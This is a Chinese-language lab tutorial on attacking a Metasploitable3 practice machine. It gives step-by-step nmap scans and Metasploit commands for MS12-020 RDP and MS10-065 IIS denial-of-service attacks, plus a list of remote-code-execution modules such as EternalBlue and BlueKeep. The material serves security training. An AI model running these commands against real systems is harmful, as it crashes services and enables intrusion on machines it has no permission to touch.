# 01 - Metasploitable3 靶机攻击

## 一、知识点总结

### 1. MS12-020 漏洞（RDP 远程桌面拒绝服务）

- **漏洞类型**：远程桌面协议（RDP）拒绝服务漏洞
- **CVE 编号**：CVE-2012-0002
- **影响系统**：Windows XP / Vista / 7 / Server 2003 / Server 2008
- **原理**：攻击者向目标发送特制 RDP 数据包，触发 `MS12-020` 中的通道 ID 处理缺陷，导致目标系统蓝屏重启（BSOD）
- **利用模块**：
  - 检测模块：`auxiliary/scanner/rdp/ms12_020_check`
  - 攻击模块：`auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
- **相关 RDP 漏洞**：
  - `CVE-2019-0708`（BlueKeep）—— 远程代码执行，比 MS12-020 更危险
  - `MS08-067` —— SMB 远程代码执行（端口 445）
  - `MS17-010`（永恒之蓝）—— SMB 远程代码执行（端口 445）
  - `MS03-026` —— DCOM RPC 远程代码执行（端口 135）

### 2. IIS 重复参数请求 DoS 漏洞（MS10-065）

- **漏洞类型**：IIS 6.0 ASP 页面拒绝服务漏洞
- **CVE 编号**：CVE-2010-1899
- **原理**：IIS 的脚本处理代码在处理重复参数请求时存在栈溢出，攻击者通过向 ASP 页面发送特制 URI 请求使 IIS 服务崩溃
- **利用模块**：`auxiliary/dos/windows/http/ms10_065_ii6_asp_dos`
- **所需参数**：`rhosts`（目标IP）、`rport`（目标端口，默认 80）

### 3. Metasploitable3 其他可利用漏洞

| 漏洞 | 类型 | MSF 模块 |
|------|------|----------|
| MS17-010 永恒之蓝 | SMB RCE | `exploit/windows/smb/ms17_010_eternalblue` |
| MS08-067 | SMB RCE | `exploit/windows/smb/ms08_067_netapi` |
| BlueKeep (CVE-2019-0708) | RDP RCE | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| MS03-026 | DCOM RPC RCE | `exploit/windows/dcerpc/ms03_026_dcom` |
| FTP/SSH 弱口令 | 认证绕过 | `auxiliary/scanner/ssh/ssh_login` |

---

## 二、实操步骤

### 实验一：MS12-020 RDP DoS 攻击

**步骤 1** — 存活主机发现
```bash
nmap -sn 192.168.1.0/24
```
> 从扫描结果中确认目标 IP（如 `192.168.1.251`）

**步骤 2** — 操作系统与服务识别
```bash
nmap -sS -sV -T4 -v -n --open --reason 192.168.1.251
```
> 确认目标为 Windows Server 2008，开放 3389 端口

**步骤 3** — 启动 Metasploit 并搜索模块
```bash
msfconsole
search ms12-020
```

**步骤 4** — 漏洞检测
```bash
use auxiliary/scanner/rdp/ms12_020_check
set rhosts 192.168.1.251
run
```
> 显示 "The target is vulnerable" 表示目标存在漏洞

**步骤 5** — 执行 DoS 攻击
```bash
use auxiliary/dos/windows/rdp/ms12_020_maxchannelids
set rhosts 192.168.1.251
run
```

**步骤 6** — 验证结果
> 切换到目标靶机，观察是否蓝屏重启

### 实验二：IIS 重复参数请求 DoS 攻击

**步骤 1** — 存活主机发现
```bash
nmap -sn 192.168.220.0/24
```

**步骤 2** — 目标信息收集
```bash
nmap -A 192.168.220.141
```

**步骤 3** — 启动 MSF 并加载模块
```bash
msfconsole
use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos
```

**步骤 4** — 配置参数
```bash
show options
set rhosts 192.168.220.141
set rport 8022
```

**步骤 5** — 执行攻击
```bash
run
```

**步骤 6** — 验证结果
> 切换到目标靶机，打开任务管理器查看 CPU / 内存占用是否异常飙升

---

## 三、常见问题与排错

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| `nmap -sn` 无结果 | 网段错误或防火墙阻止 ICMP | 检查网段，尝试 `nmap -Pn` 跳过主机发现 |
| MSF 搜索无结果 | 模块名拼写错误或数据库未初始化 | 使用 `db_reconnect` 重建连接，确认拼写 |
| `set rhosts` 报错 | 未切换到正确模块 | 先执行 `use` 命令再 `set` |
| 攻击无效果 | 目标已打补丁或端口不对 | 先用 `check` 模块验证漏洞存在性 |
| IIS DoS 攻击不稳定 | 该漏洞本身不稳定 | 多次执行 `run`，观察资源变化趋势 |
| 目标蓝屏但未重启 | 系统配置了不自动重启 | 等待或手动重启靶机 |

---

## 四、速记口诀

```
MSF 攻击四步走：
搜(search) → 选(use) → 设(set) → 跑(run)

RDP 漏洞记 020：
三百八十九是门，特制数据包一发蓝屏真

IIS DoS 记 065：
ASP 参数重复发，栈溢出崩 IIS 它

漏洞编号记规律：
MS 年份-序号，CVE 年份-编号
永恒之蓝 17-010，蓝屏 12-020，RPC 03-026
```
